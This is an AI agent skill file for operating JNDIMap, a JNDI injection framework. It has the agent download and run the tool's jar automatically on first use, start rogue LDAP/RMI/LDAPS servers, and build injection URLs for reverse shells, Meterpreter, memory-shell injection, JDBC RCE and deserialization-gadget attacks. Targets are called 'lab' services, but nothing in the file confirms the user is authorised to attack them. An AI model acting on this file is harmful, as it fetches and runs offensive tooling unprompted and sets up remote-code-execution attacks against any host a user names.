---
name: jndi-map
description: >-
  Use this skill for JNDIMap, a JNDI injection framework for RMI, LDAP, and
  LDAPS. It helps run the jar, choose flags and ports, build JNDI URLs for Basic
  payloads, MemShell injection, BeanFactory bypasses, JDBC RCE, Tomcat XXE,
  Hessian, LDAP deserialization gadgets, custom scripts, and advanced options
  such as JShell, reference-only mode, confusing class names, overlong
  encoding and lambda suffixes.
allowed-tools: Bash(java:*)
---

# JNDIMap

Use this skill to help with JNDIMap setup, documentation lookup, command construction, URL format selection, protocol configuration, module selection, and troubleshooting. JNDIMap supports LDAP, RMI, and LDAPS services, Basic payloads, BeanFactory bypasses, JDBC-related payloads, LDAP deserialization, Hessian, Tomcat XXE, custom scripts, and advanced runtime options.

## Start Here

1. Check the local runtime before giving run commands:
   - JNDIMap is recommended for JDK 8 or newer.
   - Run `java -version` when the user wants to execute JNDIMap locally.
   - If Java is missing or older than Java 8, explain that JDK 8+ is required before running the jar.
2. Ensure the JNDIMap jar exists before using it.
   - Look for `scripts/JNDIMap*.jar`.
   - Treat `scripts/` as empty if it only contains placeholder files such as `.gitkeep`.
   - On first use, if no JNDIMap jar is present, automatically download the latest release jar from `https://github.com/X1r0z/JNDIMap/releases/latest` into `scripts/`.

## First-Use Setup

When `scripts/` has no `JNDIMap*.jar`, download the latest release asset whose name matches `JNDIMap*.jar`.

Use this approach from the skill directory:

```bash
mkdir -p scripts
asset_url="$(curl -s https://api.github.com/repos/X1r0z/JNDIMap/releases/latest | sed -n 's/.*"browser_download_url": "\(.*JNDIMap[^"]*\.jar\)".*/\1/p' | head -n 1)"
test -n "$asset_url"
curl -L "$asset_url" -o "scripts/$(basename "$asset_url")"
```

After downloading, use the discovered jar path in later commands:

```bash
jar_path="$(find scripts -maxdepth 1 -type f -name 'JNDIMap*.jar' | sort | tail -n 1)"
java -jar "$jar_path" -h
```

## Documentation Selection

Read only the document section relevant to the user's task.

Prefer Chinese references for Chinese conversations and English references for English conversations.

- General overview, features, compile notes, and quick start: `references/README.md` or `references/README.en.md`
- CLI flags, ports, URL format, payload categories, bypasses, JDBC, deserialization, scripts, and advanced options: `references/USAGE.md` or `references/USAGE.en.md`

Useful anchors in `USAGE`:

- `Usage`: CLI flags such as `-i`, `-u`, `-r`, `-l`, `-s`, `-p`, `-f`, `--use-reference-only`, `--confusing-class-name`, `--jshell`, and `--overlong-encoding`
- `URL Format`: payload path structure and LDAP/RMI/LDAPS substitutions
- `Basic Functions`: DNSLog, command, bytecode loading, reverse shell, Meterpreter
- `MemShell Injection`: Tomcat and Spring Web MVC lab payload forms
- `BeanFactory Bypass`: high-version JDK bypass approaches and target dependency/version constraints
- `JDBC RCE`: MySQL, PostgreSQL, H2, Derby, Databricks related lab workflows
- `Tomcat Blind XXE`, `Hessian RCE`, `LDAP Deserialization`, `Script`, and `Advanced Techniques`

## Command Workflow

When helping a user run JNDIMap:

1. Confirm the bind IP and protocol ports they intend to use.
   - Default examples in the docs use LDAP `1389`, RMI `1099`, LDAPS `1636`, and HTTP `3456`.
   - Prefer the user's explicit IP instead of `127.0.0.1` when the target lab service must reach the JNDIMap host.
2. Build commands with the local jar path from `scripts/`.
3. Include only options relevant to the requested scenario.
4. Explain any dependency or version precondition from the docs, especially for bypass, JDBC, deserialization, JShell, Nashorn, and JDK 21 behavior.
5. For commands that run a server, tell the user what URL to give the lab target and which local port should receive callbacks.

Typical server startup:

```bash
java -jar scripts/JNDIMap-version.jar -i <jndimap-host-ip>
```

Common variations:

```bash
java -jar scripts/JNDIMap-version.jar -i <jndimap-host-ip> -l 1389 -r 1099 -s 1636 -p 3456
java -jar scripts/JNDIMap-version.jar -i <jndimap-host-ip> -u "/Basic/DNSLog/<domain>"
java -jar scripts/JNDIMap-version.jar -i <jndimap-host-ip> --jshell
java -jar scripts/JNDIMap-version.jar -i <jndimap-host-ip> --use-reference-only
```

## URL Construction Rules

Use the docs' URL format exactly:

```text
<protocol>://<jndimap-host>:<port>/<controller>/<action>/<args...>
```

Protocol substitutions:

- LDAP: `ldap://<host>:1389/...`
- RMI: replace the LDAP prefix with `rmi://<host>:1099/...`
- LDAPS: replace the LDAP prefix with `ldaps://<host>:1636/...`

When arguments include spaces, shell metacharacters, slashes, or values that the user wants encoded, prefer the documented base64-url-encoded form. Make clear which values are placeholders and which are literal path components.

## Response Pattern

For setup or command-generation answers, include:

1. The JDK/Jar prerequisite check.
2. The exact command(s) or URL(s), with placeholders clearly named.
3. Any version, dependency, protocol, or port caveats from the docs.
4. A short validation step, such as checking console output, DNS callback, HTTP callback, or target lab behavior.

Keep responses concise. Do not paste large sections of the reference docs; cite the relevant section names and summarize only what is needed for the user's immediate task.
